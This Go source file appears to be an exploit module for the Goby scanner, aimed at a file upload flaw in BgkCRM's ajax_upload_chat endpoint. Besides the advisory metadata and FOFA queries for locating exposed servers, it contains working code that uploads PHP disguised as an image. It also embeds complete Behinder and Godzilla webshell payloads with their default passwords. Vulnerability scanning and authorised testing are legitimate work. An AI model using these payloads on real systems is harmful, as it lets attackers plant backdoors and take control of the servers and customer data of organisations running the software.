package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "BgkCRM ajax_upload_chat File Upload Vulnerability",
    "Description": "<p>BgkCRM is a customer management system that integrates customer files, sales records, business transactions and other functions.</p><p>BgkCRM ajax_ upload_ Chat has a file upload vulnerability, which can be exploited by an attacker to gain server privileges.</p>",
    "Product": "BgkCRM",
    "Homepage": "https://www.bgk100.com/",
    "DisclosureDate": "2023-02-23",
    "Author": "heiyeleng",
    "FofaQuery": "(title=\"用户登录\" && body=\"/themes/default/js/jquery.code.js\") || header=\"Set-Cookie: bgk_session=a%3A5\" || body=\"<p id=\\\"admintips\\\" >初始账号：admin\" || banner=\"Set-Cookie: bgk_session=a%3A5\"",
    "GobyQuery": "(title=\"用户登录\" && body=\"/themes/default/js/jquery.code.js\") || header=\"Set-Cookie: bgk_session=a%3A5\" || body=\"<p id=\\\"admintips\\\" >初始账号：admin\" || banner=\"Set-Cookie: bgk_session=a%3A5\"",
    "Level": "3",
    "Impact": "<p>Due to the lax filtering of the files uploaded by the file upload function in the code or the unfixed parsing vulnerability of the web server, the attacker can upload arbitrary files through the file upload point, including the website backdoor file (webshell) to control the entire website.</p>",
    "Recommendation": "<p>1.The manufacturer has not released a vulnerability patch yet. Please pay attention to the manufacturer's homepage for timely updates: <a href=\"https://www.bgk100.com/\">https://www.bgk100.com/</a> .</p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "webshell,custom",
            "show": ""
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "behinder,godzilla",
            "show": "attackType=webshell"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "test.txt",
            "show": "attackType=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "test",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "帮管客 CRM ajax_upload_chat 文件上传漏洞",
            "Product": "帮管客CRM",
            "Description": "<p>帮管客CRM是一款集客户档案、销售记录、业务往来等功能于一体的客户管理系统。</p><p>帮管客CRM ajax_upload_chat 存在文件上传漏洞，攻击者可利用该漏洞获取服务器权限。</p>",
            "Recommendation": "<p>1、厂商暂未发布漏洞补丁，请关注厂商主页及时获取更新：<a href=\"https://www.bgk100.com/\">https://www.bgk100.com/</a>。</p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可以通过该漏洞在网站上上传恶意文件，从而导致严重的安全风险。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "BgkCRM ajax_upload_chat File Upload Vulnerability",
            "Product": "BgkCRM",
            "Description": "<p>BgkCRM is a customer management system that integrates customer files, sales records, business transactions and other functions.</p><p>BgkCRM ajax_ upload_ Chat has a file upload vulnerability, which can be exploited by an attacker to gain server privileges.</p>",
            "Recommendation": "<p>1.The manufacturer has not released a vulnerability patch yet. Please pay attention to the manufacturer's homepage for timely updates: <a href=\"https://www.bgk100.com/\">https://www.bgk100.com/</a> .</p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Due to the lax filtering of the files uploaded by the file upload function in the code or the unfixed parsing vulnerability of the web server, the attacker can upload arbitrary files through the file upload point, including the website backdoor file (webshell) to control the entire website.</p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-08-01",
    "PocId": "10812"
}`
	getCfg7629800 := func(url, httpType string) *httpclient.RequestConfig {
		var cfg *httpclient.RequestConfig
		if httpType == "post" {
			cfg = httpclient.NewPostRequestConfig(url)
		} else {
			cfg = httpclient.NewGetRequestConfig(url)
		}
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		return cfg
	}
	sendShell798123ad := func(hostInfo *httpclient.FixUrl, fileName, webShellContent, attackType string) (*httpclient.HttpResponse, error) {
		var cfg1 *httpclient.RequestConfig
		var trueResp *httpclient.HttpResponse
		cfg := getCfg7629800("/index.php/login", "")
		resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		if err != nil {
			return resp, nil
		}
		if resp.StatusCode == 200 {
			cfg1 = getCfg7629800("/index.php/upload/ajax_upload_chat?type=image", "post")
			cfg1.Header.Store("Content-type", "multipart/form-data; boundary=----WebKitFormBoundaryP85wZUzxCEb9PRNl")
			cfg1.Header.Store("Cookie", "bgk_session="+resp.Cookie)
			if attackType != "custom" {
				fileName = goutils.RandomHexString(6)
				fileName += ".php"
			}
			cfg1.Data = "------WebKitFormBoundaryP85wZUzxCEb9PRNl\r\nContent-Disposition: form-data; name=\"file\"; filename=\"" + fileName + "\"\r\nContent-Type: image/jpeg\r\n\r\n" + webShellContent + "\r\n------WebKitFormBoundaryP85wZUzxCEb9PRNl--"

			if resp, err := httpclient.DoHttpRequest(hostInfo, cfg1); err == nil {
				if resp.StatusCode == 302 && strings.Contains(resp.RawBody, "\"code\":0") {
					uploadPath := regexp.MustCompile(`"src":"(.*)"`).FindStringSubmatch(resp.Utf8Html)[1]
					uploadPathReplace := strings.Replace(uploadPath, "\\", "", -1)
					cfg2 := getCfg7629800(uploadPathReplace, "")
					resp1, err := httpclient.DoHttpRequest(hostInfo, cfg2)
					if err != nil {
						return resp1, nil
					}
					trueResp = resp1
				}
			}
		}
		return trueResp, err
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			resp, err := sendShell798123ad(hostInfo, "", "<?php echo '123456' ?>", "poc")
			if err != nil {
				return false
			}
			return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "123456")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			content := goutils.B2S(ss.Params["content"])
			if attackType == "webshell" {
				webShell := goutils.B2S(ss.Params["webshell"])
				if webShell == "behinder" {
					// /*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
					content = `<?php @error_reporting(0); session_start(); $key="e45e329feb5d925b"; $_SESSION['k']=$key; session_write_close(); $post=file_get_contents("php://input"); if(!extension_loaded('openssl')) {$t="base64_"."decode"; $post=$t($post.""); for($i=0;$i<strlen($post);$i++) {$post[$i] = $post[$i]^$key[$i+1&15]; }} else {$post=openssl_decrypt($post, "AES128", $key);} $arr=explode('|',$post); $func=$arr[0]; $params=$arr[1]; class C{public function __invoke($p) {eval($p."");}} @call_user_func(new C(),$params); ?>`
				} else if webShell == "godzilla" {
					// 哥斯拉 pass key
					content = `<?php eval($_POST["pass"]);`
				}
				resp, err := sendShell798123ad(expResult.HostInfo, "", content, "exp")
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				if resp.StatusCode == 200 {
					expResult.Success = true
					expResult.Output += "WebShell URL: " + expResult.HostInfo.FixedHostInfo + resp.Request.URL.Path + "\n"
					if attackType != "custom" && webShell == "behinder" {
						expResult.Output += "Password: rebeyond\n"
						expResult.Output += "WebShell tool: Behinder v3.0\n"
					} else if attackType != "custom" && webShell == "godzilla" {
						expResult.Output += "Password: pass 加密器：PHP_EVAL_XOR_BASE64\n"
						expResult.Output += "WebShell tool: Godzilla v4.1\n"
					} else {
						fmt.Println("no")
					}
					expResult.Output += "Webshell type: php"
				} else {
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				}
			} else if attackType == "custom" {
				fileName := goutils.B2S(ss.Params["filename"])
				resp, err := sendShell798123ad(expResult.HostInfo, fileName, content, "custom")
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				if resp.StatusCode == 200 {
					expResult.Success = true
					expResult.Output = "漏洞利用成功\n"
					expResult.Output += "File URL: " + expResult.HostInfo.FixedHostInfo + resp.Request.URL.Path + "\n"
				} else {
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				}
			}
			return expResult
		},
	))
}
